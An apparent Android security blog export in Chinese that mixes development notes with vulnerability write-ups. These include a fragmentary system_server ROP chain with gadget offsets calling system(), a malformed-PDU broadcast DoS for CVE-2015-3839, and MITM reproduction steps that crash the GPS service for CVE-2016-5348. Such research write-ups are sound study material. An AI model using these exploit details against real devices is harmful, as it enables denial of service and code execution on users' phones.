堆喷射system_server进程向android设备提供绝大部分的系统服务，通过这些服务的一些特定方法我们可以向system_server传输一个String，同时system_server把这个String存储在Dalvik-heap中不被销毁（因为我们需要使用注入代码段对这片内存区域进行填充 3. 栈翻转和rop1234567891011121314151617181920212223/* 内存构造如下： --------------------------------------------------. staticAddr + gadgetChunkOffset . staticAddr + gadgetChunkOffset - 4 . staticAddr + gadgetChunkOffset - 4*i slide code ... . ... . 1 . --------------------------------------------------- gadget_0_addr //shell_code_begin_here staticAddr + 0xC //shell_code + 4 gadget_1_addr //shell_code + 8 gadget_2_addr //shell_code + 12 ******** R0 //shell_code + 16 system函数的参数 ... ... ... system_addr //shell_code + 64 ... ... */ 其中ROP构造如下： 123456/* rop[0]:(libwebviewchromium.so 0x004fed00)ldr r4, [r5, #4] ; mov r0, r5 ; ldr r7, [r5] ; ldr.w r8, [r4, #0x48] ; ldr r1, [r7, #8] ; blx r1 rop[1]:(libdvm.so 0x00068e5a ) mov sp, r7 ; pop &#123;r3, r4, r7, pc&#125; rop[2]:(libwebviewchromium.so 0x007dfc0c ) add r1, sp, #8 ; ldr r3, [sp, #0x30] ; mov r0, sp ; blx r3 rop[3]:(libc.so system函数 0x250E0) */]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android AIDL笔记]]></title>
    <url>%2F2017%2F12%2F09%2FAndroid-AIDL%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[在Android系统中，通常一个进程不能访问其它进程的内存。AIDL(Android Interface definition language)允许定义客户端和服务端都同意为了彼此之间的通信使用进程间通信（IPC）的编程接口，其本质是用Binder实现的。 以下为一个简单的AIDL实例 服务端1.新建AIDL文件首先用Android Studio 新建一个Android工程，这里命名为com.example.AIDL_Server。在工程目录下，“右键“-&gt;”New”-&gt;”AIDL File”,这里接口命名为“MyAidl”，每个.aidl文件必须定义一个接口并且只需要接口声明。 这里定义接口方法为Add，返回客户端输入的两个数之和。MyAidl.aidl文件如下： 12345package com.example.aidl_server.myapplication;interface MyAidl &#123; int Add(int a,int b);&#125; 接着Make一下，自动会生成对应的Java文件，生成的文件名和.aidl文件名匹配，但扩展名为.java，本质为Binder实现。 ###2.实现接口上一步定义好了接口和Add方法，需要进一步实现。新建一个Service，在Service中新建一个内部类MyAidl.Stub,在该类中实现Add接口。 3.对外暴漏接口在Service中的onBind函数中返回接口，另外还需注意在manifest文件中声明Service接口，代码如下： 123456789101112131415161718 public class Add extends Service &#123; private MyAidl.Stub mRemote = new MyAidl.Stub()&#123; @Override public int Add(int a, int b) throws RemoteException &#123; return a+b; &#125; &#125;; public Add() &#123; &#125; @Override public IBinder onBind(Intent intent) &#123; return mRemote; &#125;&#125; 客户端1.复制AIDL文件当客户端与服务器不在同一个应用程序中时，客户端必须也复制一份AIDL文件到其目录下，并且包的路径和名称不能改动，这里直接将服务端AIDL目录整体复制到客户端main目录下，同样编译后生成对应的Java文件。 2.新建ServiceConnection对象当一个客户端（例如activity）调用bindService()连接到这个service，客户端的onServiceConnected()回调接收到由service的onBind()返回的mBinder实例。 import远程AIDL包，定义一个远程AIDL对象，新建一个ServiceConnection对象，在其ServiceConnection（）函数中将接收到的Binder进行转换。 3.远程调用调用Add进行加法运算，注意捕获RemoteException异常。代码如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051public class MainActivity extends AppCompatActivity &#123; public MyAidl mRemote = null; public ServiceConnection sc= new ServiceConnection() &#123; @Override public void onServiceConnected(ComponentName componentName, IBinder iBinder) &#123; mRemote = MyAidl.Stub.asInterface(iBinder); System.out.println("-----Connect---------"); &#125; @Override public void onServiceDisconnected(ComponentName componentName) &#123; mRemote=null; &#125; &#125;; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Intent intent = new Intent("com.example.aidl_server.myapplication.Add"); bindService(intent,sc, Context.BIND_AUTO_CREATE); Button bt = (Button) findViewById(R.id.button); bt.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View view) &#123; try &#123; System.out.println(mRemote.Add(1, 2)); Toast.makeText(MainActivity.this, String.valueOf(mRemote.Add(1, 2)),Toast.LENGTH_SHORT).show(); &#125; catch (RemoteException e)&#123; e.printStackTrace(); &#125; &#125; &#125;); &#125;&#125; 遇到的坑 服务端的Service需要启动，我是在MainActivity 里new Add（）才启动服务 bindService时，Intent名字要对应 客户端直接在OnCreate函数里进行远程调用失败，加了个Button在onClick里调用正常 参考链接 Android开发指南——进程间通信AIDL android中的AIDL进程间通信 AIDL binder框架浅析（比较详细） 另一篇比较详细的]]></content>
  </entry>
  <entry>
    <title><![CDATA[cve-2015-3839(短信 Dos)]]></title>
    <url>%2F2017%2F12%2F09%2Fcve-2015-3839-%E7%9F%AD%E4%BF%A1-Dos%2F</url>
    <content type="text"><![CDATA[漏洞描述漏洞发生在Android自带短信应用中updateMessageStatus函数中，该函数用于发送短信完成后更新状态。代码中未对异常进行处理（使用try…finally…，未加catch），且相关的服务对外暴露，恶意程序可以构造恶意的短信发送广播，导致自带的短信应用无法工作。 漏洞代码如下： 当message为null时，访问message对象中的函数或变量就会发生空指针异常，导致短信应用Crash. 函数开始对message是否为空作了判断，因此需要绕过判断。createFromPdu函数是对收到的pdu格式的短信进行解析，返回一个SmsMessage对象，如下图： 该函数根据format的格式（3GPP为GSM，3GPP2为CMDA）去解析PDU，最后返回一个wrappedMessage对象，最后的return没有直接返回wrappedMessage对象，而是通过new的方式返回，导致返回值永不为null。因此，只要wrappedMessage对象为null时，就会绕过”if (message==null)”的检查，触发空指针异常。 漏洞利用为使wrappedMessage对象为null,只需要构造一个无效的PDU串即可。 &gt;PDU为发送短信时一种固定的编码格式，一般的PDU编码由A B C D E F G H I J K L M十三项组成。A：短信息中心地址长度，2位十六进制数(1字节)。B：短信息中心号码类型，2位十六进制数。C：短信息中心号码，B+C的长度将由A中的数据决定。D：文件头字节，2位十六进制数。E：信息类型，2位十六进制数。F：被叫号码长度，2位十六进制数。G：被叫号码类型，2位十六进制数，取值同B。H：被叫号码，长度由F中的数据决定。I：协议标识，2位十六进制数。J：数据编码方案，2位十六进制数。K：有效期，2位十六进制数。L：用户数据长度，2位十六进制数。M：用户数据，其长度由L中的数据决定。J中设定采用UCS2编码，这里是中英文的Unicode字符。&gt; 考虑到第一个字节为长度标志位，只要将其置0即可够造一个恶意的PDU,参考PDU在线解析，这里伪造的PDU如下：10091683108200505F0 为触发漏洞代码，需要找到漏洞代码的调用路径，跟踪短信源码发现updateMessageStatus函数在MessageStatusService服务中，查看menifest文件发现MessageStatusService并没有对外导出。但是短信应用注册了一个recever叫做MessageStatusReceiver，它收到广播后会开启MessageStatusService服务，因此，通过发送“com.android.mms.transaction.MessageStatusReceiver.MESSAGE_STATUS_RECEIVED”广播可以触发漏洞代码。 为保证createFromPdu不会返回null,还需要指定短信的format为3gpp或3gpp2。此外，若要对短信应用进行DOS，需要不停的发送广播。 PoC代码见https://github.com/mabin004/cve-2015-3839_PoC 漏洞修复由漏洞patch可以看出，google在漏洞代码处加了catch来捕获空指针异常。 ##总结 这个漏洞的存在关键在两个地方： 没有加catch捕获异常，如果加catch后，任何DoS攻击都无效； return的时候没有进行判断，直接new一个对象就return了，这里是绕过null检查的关键]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android源码编译命令]]></title>
    <url>%2F2017%2F12%2F09%2FAndroid%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[1.编译过程1) source build/envsetup.sh 2) lunch,选择编译的平台 3）make －j4 ##2. 命令介绍 1）m 编译整个android工程 2）mm 编译当前目录下模块，不包括依赖项 3）mmm path 编译指定目录下的模块 4）mma 编译当前目录下所有模块，包括依赖项 5）mmma path 编译指定目录下所有模块，含依赖项 PS： mm／mmm编译较快，mma／mmma会把所有的依赖项一同编译，比较缓慢，首次编译时用mma，以后用mm编译。 3.Android.mk解析1. mk文件 一个android子项目中会存在一个或多个Android.mk文件 1) 单一的Android.mk文件 直接参考NDK的sample目录下的hello-jni项目，在这个项目中只有一个Android.mk文件 2) 多个Android.mk文件 如果需要编译的模块比较多，我们可能会将对应的模块放置在相应的目录中， 这样，我们可以在每个目录中定义对应的Android.mk文件（类似于上面的写法）， 最后，在根目录放置一个Android.mk文件，内容如下： include $(call all-subdir-makefiles) 只需要这一行就可以了，它的作用就是包含所有子目录中的Android.mk文件 2. 变量注意：‘:=’是赋值的意思；’+=’是追加的意思；‘$’表示引用某变量的值。 1）LOCAL_PATH: 这个变量用于给出当前文件的路径。 必须在 Android.mk 的开头定义，可以这样使用： LOCAL_PATH := $(call my-dir) 如当前目录下有个文件夹名称 src，则可以这样写 $(call src)，那么就会得到 src 目录的完整路径 这个变量不会被$(CLEAR_VARS)清除，因此每个 Android.mk 只需要定义一次(即使在一个文件中定义了几个模块的情况下)。 2）CLEAR_VARS: 必须在开始一个新模块之前包含这个脚本：include$(CLEAR_VARS)，用于重置除LOCAL_PATH变量外的，所有LOCAL_XXX系列变量。 3）LOCAL_MODULE: 这是模块的名字，它必须是唯一的，而且不能包含空格。 4）LOCAL_SRC_FILES: 这是要编译的源代码文件列表。 只要列出要传递给编译器的文件，因为编译系统自动计算依赖。注意源代码文件名称都是相对于 LOCAL_PATH的，你可以使用路径部分，例如： LOCAL_SRC_FILES := foo.c toto/bar.c\ Hello.c 文件之间可以用空格或Tab键进行分割,换行请用&quot;\&quot; 如果是追加源代码文件的话，请用LOCAL_SRC_FILES += 5）LOCAL_STATIC_LIBRARIES: 表示该模块需要使用哪些静态库，以便在编译时进行链接时就需要 6）LOCAL_SHARED_LIBRARIES: 表示模块在运行时要依赖的共享库（动态库），在链接时就需要 7）LOCAL_LDLIBS: 编译模块时要使用的附加的链接器选项。这对于使用‘-l’前缀传递指定库的名字是有用的。 例如，LOCAL_LDLIBS := -lz表示告诉链接器生成的模块要在加载时刻链接到/system/lib/libz.so 可查看 docs/STABLE-APIS.TXT 获取使用 NDK发行版能链接到的开放的系统库列表。 8）LOCAL_MODULE_PATH 和 LOCAL_UNSTRIPPED_PATH 在 Android.mk 文件中， 还可以用LOCAL_MODULE_PATH 和LOCAL_UNSTRIPPED_PATH指定最后的目标安装路径. 不同的文件系统路径用以下的宏进行选择： TARGET_ROOT_OUT：表示根文件系统。 TARGET_OUT：表示 system文件系统。 TARGET_OUT_DATA：表示 data文件系统。 用法如：LOCAL_MODULE_PATH :=$(TARGET_ROOT_OUT) 9）BUILD_STATIC_LIBRARY：编译为静态库。 BUILD_SHARED_LIBRARY ：编译为动态库 BUILD_EXECUTABLE：编译为Native C可执行程序 4. 编译后的文件 经过make编译后的产物，都位于/out目录，该目录下主要关注下面几个目录： 1）. /out/host：Android开发工具的产物，包含SDK各种工具，比如adb，dex2oat，aapt等。 2) /out/target/common：通用的一些编译产物，包含Java应用代码和Java库； 3） /out/target/product/[product_name]：针对特定设备的编译产物以及平台相关C/C++代码和二进制文件； 其中，有几个重量级的镜像文件： system.img:挂载为根分区，主要包含Android OS的系统文件； ramdisk.img:主要包含init.rc文件和配置文件等； userdata.img:被挂载在/data，主要包含用户以及应用程序相关的数据； 当然还有boot.img，reocovery.img等镜像文件，这里就不介绍了。 ##5. 编译遇到的问题 ###1. GC overhead limit exceeded解决： 12345export JACK_SERVER_VM_ARGUMENTS="-Dfile.encoding=UTF-8 -XX:+TieredCompilation -Xmx4g"./prebuilts/sdk/tools/jack-admin kill-server./prebuilts/sdk/tools/jack-admin start-server 2. lunch一定要在根目录lunch一定要在根目录进行，否则会删除之前编译好的文件。 例如：我先全部编译一遍，此时在out目录下生成镜像文件。如果再新建一个Terminal，cd 到其它目录里，source一下，然后lunch，此时我原先编译好的文件都丢失了。 3. 编译完成后刷入镜像make snod命令]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cve-2016-5348(利用大文件使gps crash)]]></title>
    <url>%2F2017%2F12%2F09%2Fcve-2016-5348-%E5%88%A9%E7%94%A8%E5%A4%A7%E6%96%87%E4%BB%B6%E4%BD%BFgps-crash%2F</url>
    <content type="text"><![CDATA[描述通过中间人攻击（MITM）构造一个gps相关的文件（由Qualcomm提供），可以使Android设备的gps服务崩溃，设备重启。问题出现在AOSP代码和由Quanlcomm实现的XTRA下载代码中。该漏洞还有可能影响所有的Qualcomm GPS芯片。 背景(GPS和gpsOneXtra)大多数移动设备通过GPS（Global Positioning System）实现定位，它由美国的军事部门开发和维护，其他国家也有类似的定位系统，如俄罗斯的GLONASS，欧洲的Galileo，中国的北斗。 广播星历是定位卫星发出的无线电信号上载有预报一定时间内卫星根数的电文信息，通过星历接收者可以很快获得离自己最近的卫星，避免了依次去查找卫星。 Qualcomm开发了一套系统称为gpsOneXtra,通过它设备可以从高通的服务器上下载卫星数据（Xtra文件），该文件包含了当前的卫星位置数据以及未来7天卫星可能的位置，大多数的高通gps芯片都支持这项技术。 ##背景2 -Android和gpsOneXtra文件 通过对Android设备的流量监控发现，每当设备连接到WiFi网络时，会向高通的服务器发起请求，获取gpsOneXtra文件。在Android相关的源码中，出现了以下url: 123http://xtra1.gpsonextra.net/xtra.binhttp://xtra2.gpsonextra.net/xtra.binhttp://xtra3.gpsonextra.net/xtra.bin 123http://xtrapath1.izatcloud.net/xtra2.binhttp://xtrapath2.izatcloud.net/xtra2.binhttp://xtrapath3.izatcloud.net/xtra2.bin 使用whois工具查询这些域名，发现gpsonextra.net和izatcloud.net都是高通的域名，进一步研究发现他们用的Amazon的云服务。 进一步查看Android源码发现，该请求由系统级别的Java代码发起GpsXtraDownloader.java,之后通过JNI传到native代码中com_android_server_location_GnssLocationProvider.cpp,最终交由高通的硬件来解析。 漏洞细节Android设备在连接wifi时会自动下载XTRA文件，然而相关的代码并未检查XTRA文件的大小，如果一个XTRA文件大小超过了机器的最大内存，设备就会重启。攻击者通过MITM，将下载请求链接到自己伪造的XTRA大文件，从而造成远程拒绝服务攻击。 漏洞发生在以下代码中： 12345678910111213141516#GpsXtraDownloader.java, lines 120-127connection.connect();int statusCode = connection.getResponseCode();if (statusCode != HttpURLConnection.HTTP_OK) &#123;if (DEBUG) Log.d(TAG, “HTTP error downloading gps XTRA: “+ statusCode);return null;&#125;return Streams.readFully(connection.getInputStream()); 整个过程未检测文件的大小，且使用readFully会将整个文件读到内存中，因此会造成内存不足，设备重启。 漏洞复现 更改手机hosts文件（/etc/hosts），把相关域名指向攻击者控制的服务器； 服务器上放一个超过设备内存大小的文件 打开/关闭wifi，或者打开/关闭飞行模式 Note:由于缓存并非每次都会下载XTRA文件，此时需要重启手机或者参考http://stackoverflow.com/questions/14548707/android-how-to-reset-and-download-a-gps-data。也可以安装如GPS Status 、ToolboxGPS Status等工具. 漏洞修复在Java层和native层增加了对XTRA文件大小的检查。]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android源码结构]]></title>
    <url>%2F2017%2F12%2F09%2Fandroid%E6%BA%90%E7%A0%81%E7%BB%93%E6%9E%84%2F</url>
    <content type="text"><![CDATA[abi应用程序二进制接口（abi is application binary interface） artAndroid运行时机制相关 bionicLinux内核中库 libc C库 limdl 动态链接库相关 libm C数学函数，运算相关 libstdc＋＋ 标准C＋＋库 bootable引导、安装程序，其他设备启动的东西 buildbuild的时候的一些脚本和环境 cts兼容性测试框架（compatibility test suite）（没用过） dalvikJava虚拟机相关 development开发相关的工具，SDK、NDK等 devices特定厂商的设备文件 docs文档相关 external外部库和工具的源代码。Webkit，Sqlite，zlib等 frameworks重要的目录之一。System Server、Package Manager、Activity Manager等关键服务的实现，java层到native层的映射 hardware部分厂家开源的硬件适配层（HAL）代码，Wifi、电源等 kernel内核源码 libcore一些核心的库 Dalvik dom expectations include json luni support xml libnativehelper没用过 ndk本地开发包 out编译完成后输出目录，out/target/product/genetic 目录存放编译完成的镜像。 packages标准的应用程序，相机、短信、拨号等 pdkplatform build kit，方便vendor适配最新android，避免碎片化 prebuilt预先编译好的二进制文件，例如交叉编译工具等 sdk开发环境 systemandroid核心系统，可以认为是一个微型的Linux系统，运行在Dalvik虚拟机和java层服务开启前，包含init进程 toolsgradle等工具 vendor厂商代码]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[apk反调试-模拟器检查-签名检测]]></title>
    <url>%2F2017%2F12%2F09%2Fapk%E5%8F%8D%E8%B0%83%E8%AF%95-%E6%A8%A1%E6%8B%9F%E5%99%A8%E6%A3%80%E6%9F%A5-%E7%AD%BE%E5%90%8D%E6%A3%80%E6%B5%8B%2F</url>
    <content type="text"><![CDATA[一、模拟器检测 基于模拟器的IMSI、IDS、默认文件等几个方面特征进行检测 基于CPU的检测（如是否包含inter、amd等字段） 电池信息、温度、电量变化等 代码示例： 123456789101112131415//需要添加android.permission.READ_PHONE_STATE权限public boolean isEmulatorByImei(Context context)&#123; TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE); String imei = tm.getDeviceId(); if (imei == null || imei.equals("000000000000000"))&#123; return true; &#125; return false; &#125;public boolean isEmulatorByBuildModel() &#123; Log.e("MODEL=", Build.MODEL); Log.e("MANUFACTURER=",Build.MANUFACTURER); return ( Build.MODEL.equals("sdk")) || (Build.MODEL.equals("google_sdk") ); &#125; 二、签名监测(native)签名检测在一般在java层实现，通过与远程服务器交互完成校验。如果没有本地校验，则尽可能在native层实现，这里利用反射的方式。 代码示例： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950void SignatureCheck(JNIEnv *env, jobject context)&#123; jclass context_clazz = (*env)-&gt;GetObjectClass(env, context);//Context的类 jmethodID methodID_getPackageManager = (*env)-&gt;GetMethodID(env, context_clazz,"getPackageManager", "()Landroid/content/pm/PackageManager;");// 得到 getPackageManager 方法的 ID jobject packageManager = (*env)-&gt;CallObjectMethod(env, context, methodID_getPackageManager);// 获得PackageManager对象 jclass pm_clazz = (*env)-&gt;GetObjectClass(env, packageManager);// 获得 PackageManager 类 jmethodID methodID_pm = (*env)-&gt;GetMethodID(env, pm_clazz, "getPackageInfo", "(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;");// 得到 getPackageInfo 方法的 ID jmethodID methodID_pack = (*env)-&gt;GetMethodID(env, context_clazz, "getPackageName", "()Ljava/lang/String;");// 得到 getPackageName 方法的 ID jstring application_package = (*env)-&gt;CallObjectMethod(env, context, methodID_pack);// 获得当前应用的包名 const char *str = (*env)-&gt;GetStringUTFChars(env, application_package, 0); //__android_log_print(ANDROID_LOG_DEBUG, "JNI", "packageName: %s\n", str); jobject packageInfo = (*env)-&gt;CallObjectMethod(env, packageManager, methodID_pm, application_package, 64);// 获得PackageInfo jclass packageinfo_clazz = (*env)-&gt;GetObjectClass(env, packageInfo); jfieldID fieldID_signatures = (*env)-&gt;GetFieldID(env, packageinfo_clazz, "signatures", "[Landroid/content/pm/Signature;"); jobjectArray signature_arr = (jobjectArray)(*env)-&gt;GetObjectField(env, packageInfo, fieldID_signatures); jobject signature = (*env)-&gt;GetObjectArrayElement(env, signature_arr, 0);//Signature数组中取出第一个元素 jclass signature_clazz = (*env)-&gt;GetObjectClass(env, signature);//读signature的hashcode jmethodID methodID_hashcode = (*env)-&gt;GetMethodID(env, signature_clazz, "hashCode", "()I"); jint hashCode = (*env)-&gt;CallIntMethod(env, signature, methodID_hashcode); //__android_log_print(ANDROID_LOG_DEBUG, "JNI", "hashcode: %d\n", hashCode); if (hashCode != 1133691199)//判断与自己签名的hashcode是否相同 &#123; exit(0); //__android_log_print(ANDROID_LOG_DEBUG, TAG, "Repackaged App, will exit :(",hashCode); &#125;&#125; 三、反调试1. ptraceida、gdb等调试工具其实都是使用ptrace进行的, ptrace有一个很重要的特定，一个进程只能被其它一个进程调试。当没有被调试时，/proc/(pid)/status文件中TracePid为0，即 （1） 如果TracePid不为0时，说明进程正在被调试。 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;jni.h&gt;#include &lt;android/log.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/ptrace.h&gt;#include &lt;unistd.h&gt;#include &lt;pthread.h&gt;void be_attached_check()&#123; const int bufsize = 1024; char filename[bufsize]; char line[bufsize]; int pid = getpid(); sprintf(filename, "/proc/%d/status", pid); FILE* fd = fopen(filename, "r"); if (fd != NULL) &#123; while (fgets(line, bufsize, fd)) &#123; if (strncmp(line, "TracerPid", 9) == 0) &#123; int statue = atoi(&amp;line[10]); //LOGD("%s", line); if (statue != 0) &#123; //LOGD("be attached !! kill %d", pid); fclose(fd); int ret = kill(pid, SIGKILL); &#125; break; &#125; &#125; fclose(fd); &#125; else &#123; LOGD("open %s fail...", filename); &#125;&#125; （2） 进程自己prace自己，就不会被第三方调试了。在jni_OnLoad函数中ptrace自身，代码如下： 123456789JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* pVm, void* reserved)&#123; ptrace(PTRACE_TRACEME, 0, 0, 0); JNIEnv* env; if ((*pVm)-&gt;GetEnv(pVm, (void **)&amp;env, JNI_VERSION_1_6)) &#123; return -1; &#125; return JNI_VERSION_1_6;&#125; 2. 暗桩ptrace容易被逆向搞掉，暗桩是在多个地方插入检测代码，增加逆向难度，例如，新建一个进程每隔几秒检测一次： 123456789101112131415161718192021void thread_task(int n)&#123; while (1)//进程每隔3秒检测一次 &#123; //LOGD("start be_attached_check..."); be_attached_check(); sleep(3); &#125;&#125;void anti_debug()&#123; pthread_t pthread_id; int i,ret; int m=2; ret=pthread_create(&amp;pthread_id,NULL,(void *)thread_task,(void *)1); if (ret!=0) &#123; printf("create pthread error!\n"); exit(0); &#125;&#125; 3. 多个进程互相ptrace]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于分辨率、4k、色域色深、HDR]]></title>
    <url>%2F2017%2F12%2F05%2F%E5%85%B3%E4%BA%8E4k%E6%8A%80%E6%9C%AF%2F</url>
    <content type="text"><![CDATA[解释4k技术，首先需要了解几个概念： 分辨率分辨率，可以从显示分辨率与图像分辨率两个方向来分类。 显示分辨率显示分辨率（屏幕分辨率）是屏幕图像的精密度，是指显示器所能显示的像素有多少。例如800×600的分辨率，是指在整个屏幕上水平显示800个像素，垂直显示600个像素。 显然，分辨率越高，显示屏可显示的像素就越多，图像就越清晰。 图像分辨率图像分辨率指图像中存储的信息量，是每英寸图像内有多少个像素点，分辨率的单位为PPI(Pixels Per Inch)，通常叫做像素每英寸，图像分辨率的表达方式也为“水平像素数×垂直像素数”。 图像分辨率和显示分辨率不匹配？显示器内部有一颗重要的集成电路叫Scaler IC，是专门用来处理当图像分辨率与显示器分辨率不同时的显示方式的。为便于理解，以具体例子来做说明。 如果图像分辨率小于显示器分辨率，如果仍以1:1显示，即一个像素对应一个像素，那屏幕就不会满屏。比如显卡输入640x480，而显示器为1280x1024，就会看到显示器左上角640x480的区块有清晰的图像，而其它剩余区域都是黑色的。为了实现满屏，就要实现图像的缩放(Scaling)，做法就是要给画面补足像素，水平方向640个像素须补足到1280个像素，垂直方向480个像素要补足到1024个像素，插入像素的插值算法取决于Scaler IC。 当图像的分辨率大于显示器时，则相反，不是补足而是要减少像素个数，这时图片的像素会被压缩，画面细节受到损失，细节分辨不清。例如用数码相机的屏幕也可以看到完整的照片，不过感觉很模糊，放在电脑上看就好多了，因为屏幕的分辨率低。 4K技术4k技术通常指4K分辨率，即指水平方向每行像素值达到或者接近4096个，多数情况下特指4096*2160分辨率。我们通常说的2K分辨率为2048×1080，1080P的分辨率为1920×1080。 广义上来说，4K是一个完整的产业链，它至少包括了内容制作方、编解码标准制定方、宽带网络运营商、芯片解决方案商、终端配件生产商、终端商和屏幕厂商等，我们平时接触的狭义概念都是广义概念的一部分。 一下有几个概念： 4k摄像机4K视频都是用4K摄像机拍摄的。4K摄像机内部有很多的感光器件，类似于数码相机里的感光元件，这些感光器件以一个矩形的样子排布，也就是在水平方向的每一行排列了3840个感光器件，一共有2160个这样的行，那么这个矩形上一共有 3840 * 2160 = 8294400 个感光器件。 为了拍摄成4K的效果，摄像师使用过去的高清摄像器材是不行的，需要使用更为专业的4K摄像器材，价格比较昂贵，而且拍一场4K的直播在其他方面的开销也是很多的，这也是为什么当前4K视频不多的原因之一。 4k片源分辨率达到40962160的视频，一张未压缩过的4k图片大小约为409621603=26.54Mb，一个2小时的24帧/s的视频大小为：24（帧）120（分钟）60（秒）50（MB）=8640000（MB）≈8.24（TB），但视频中帧之间的变化较小，通常会压缩，一部正常的4k电影大小为60G以上。 4k传输由于4k视频比较大，因此传输起来也是非常消耗带宽的,这里引用一个数据： 4k播放器播放器是用来视频解码的，解码分为软解码和硬解码： 硬件解码是图形芯片厂家提出的用 GPU 资源解码视频流的方案。与之相对的是软解，也就是传统的用 CPU 承担解码工作的方案。 现在主流的电视盒子都支持4k解码。 4k显示器4K显示器是指具备4K分辨率的显示器设备，分辨率有3840x2160和4096×2160像素2种超高分辨率规格。 目前，受成本及应用环境等因素制约，4K显示器的普及度并不高。这里的成本主要是面板的成本，在同样尺寸的液晶面板上增加像素点，就意味着坏点产生几率增加。同时，超高的分辨率对显卡提出了更高的要求，要在4K分辨率下进行娱乐应用体验，还需购置高端显卡，这增加了用户的负担。 帧率一秒钟的视频看起来是连续的，其实是由几十张图片构成的。这几十张图片按照先后顺序连续播放便形成了视频的效果。这些图片在视频技术里就叫做”帧”。 一般而言，如果一秒钟的视频帧率低于20帧，这段视频看上去就比较卡。要保持比较流畅的效果，帧率需要保持至少在25帧以上，此时人眼才感觉不出卡顿。对于4K视频而言，帧率有30有50也有60的。从观看效果来看，肯定是帧率60的看起来最流畅了。不过用60的帧率，视频的码率也会大一些，占用的带宽也大一些。 例如：在《比利·林恩》的宣传阶段，制片人等主创就强调影片120帧/4K/3D的制式能够给观众带来“极度清晰和真实的新视界”以及“全然实境的新体验”。 色域和色深色域是指能显示的颜色的范围，色深是颜色的表示精度。 色域我们知道，自然界的光谱带很宽，但我们人眼能看到的只有很窄的一段频率的光，我们管这些频率的光叫可见光，下图是人眼可以感知的色彩范围： 色域代表了显示器的色彩表现能力，色域越广的显示器色彩越丰富，表现出来的色彩就越接近真实世界和人眼的极限值，会给我们“更生动、更逼真”的感觉！ 然而，显示器并没有这么大的空间，和人眼相比，显示器能够显示的色域更小。为了管理不同的计算机上的显示效果，为了得到统一的现实效果，业界制定了sRGB,NTSC,Adobe RGB等色彩管理标准。 由于计算机很难显示全色域，所以很多显示器的宣传都是45% NTSC、72% NTSC以及100% sRGB，或者直接模糊的宣传“广色域” 色深色深可以理解为如果将一定范围内的色域划分为N份，N用多少比特可以表示。 比如8位(bit)指的是一种基色可以有2的8次方（256）种等级，10bit就表示一种基色可以分为2的10次方（1024）种等级。把三基色能表示的色等级乘起来，就是能表示的色数，比如色深是12bit，也就是红绿蓝三种基色各有2的12次方（4096）种灰度等级，连乘起来就 是4096的3次方，也就是687亿色。 显示器的色深（或色阶）越高，色彩之间过渡会越平滑细腻，色深不够就会显得生硬，甚至会产生阶梯感。 HDRHDR是High Dynamic Range Imaging，简称HDRI或HDR，它将每个曝光瞬间相对应最佳细节的LDR图像（Low-Dynamic Range，低动态范围）合成为最终的HDR图像；通俗来说，就是将同一个画面进行多次曝光，再合成为一张图像。 例如：iphone的HDR开启后会连拍三张照片，分别对应欠曝光、正常曝光和过度曝光，然后把这三张图片合到一块并且突出每张照片最好的部分从而生成一张高质量的照片。 屏幕也有HDR概念，屏幕支持HDR，就是能尽量地显示更高的亮度，也能处理好更暗的暗度。图片和电视屏只要有一个不支持HDR技术，另外一个都无法发挥HDR优势。 对于电视机屏来说，支持HDR技术就意味着这块电视机屏幕能显示出+5档次到-5档次甚至更高区间的亮度与暗度。 电视机屏支持的明暗度范围最好是大于图片的明暗度范围。如果你的图片明暗度在+10到-10的档次区间，但是你电视机屏明度只支持+5到-5档次区间，那么对于图片的+10到+5档次区间明暗度和-5到-10档次区间的明暗度，电视机屏可能就显示不出来。 参考： 图片分辨率和屏幕分辨率不一致将如何显示？ https://zhuanlan.zhihu.com/p/48206226 4K概念介绍——4K分辨率篇 https://zhuanlan.zhihu.com/p/49181772]]></content>
  </entry>
  <entry>
    <title><![CDATA[重打包apk以及问题汇总]]></title>
    <url>%2F2017%2F11%2F19%2F%E9%87%8D%E6%89%93%E5%8C%85apk%E7%9B%B8%E5%85%B3%2F</url>
    <content type="text"><![CDATA[重打包APK反编译和编译使用Apktool (https://ibotpeaches.github.io/Apktool/) 反编译：1apktool d xxx.apk -o smali_path -r,–no-res 不解析资源文件-s,–no-src 不解析代码文件 编译：1apktool b smali_path -o new.apk 签名： 使用keytools生成一个私钥（keytool 位于 JDK 中的 bin/ 目录中）12keytool -genkey -v -keystore my-release-key.jks-keyalg RSA -keysize 2048 -validity 10000 -alias my-alias 输入密码和“Distinguished Name”字段等其他信息后，会在当前目录生成一个私钥文件my-release-key.jks 通过 apksigner 使用私钥对APK进行签名1apksigner sign --ks my-release-key.jks --out my-app-release.apk my-app-unsigned-aligned.apk apksigner位于SDK目录的build-tools目录下。必须说明的是，v2签名方式时在Android7.0后才推出的，所以只有版本&gt;25的SDK\build-tools\中才能找到apksigner.jar 其他坑1. Can’t find framework resources for package of id 问题描述12345678$ apktool d HtcContacts.apk I: Loading resource table...I: Decoding resources...I: Loading resource table from file: /home/brutall/apktool/framework/1.apkW: Could not decode attr value, using undecoded value instead: ns=android, name=drawable, value=0x02020542...W: Could not decode attr value, using undecoded value instead: ns=android, name=icon, value=0x02020520Can&apos;t find framework resources for 